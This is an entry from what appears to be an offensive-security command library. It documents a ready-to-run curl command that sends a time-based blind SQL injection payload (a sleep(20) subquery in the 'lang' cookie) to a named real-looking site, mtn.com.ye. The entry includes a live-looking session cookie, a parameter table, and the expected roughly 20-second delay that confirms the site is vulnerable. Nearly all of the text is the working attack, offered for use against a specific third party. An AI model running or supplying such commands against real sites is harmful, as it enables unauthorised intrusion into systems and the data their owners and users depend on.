---
id: cmd-mtn-blind-timing
data: >-
  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696;
  lang=%2b(select*from(select(sleep(20)))a)%2b; _ga=GA1.3.1859249834.1576704214;
  _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" -H
  "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101
  Firefox/68.0" --max-time 30
tags:
  - sqli
  - blind
  - timing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.174Z'
verified: false
validated: true
submitted: true
---
# sqli-time-based-blind

## Command

```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=%2b(select*from(select(sleep(20)))a)%2b; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  --max-time 30
```

## Description

Injects a time-delay payload to confirm blind SQLi via response timing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `lang=...sleep(20)...` | URL-encoded sleep subquery | Yes |
| `--max-time 30` | Timeout to allow delay | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Delayed response ~20s.

## Related

- [[commands/sqli-double-quote-balance]]
- [[procedures/Perform-Time-Based-Blind-SQL-Injection]]
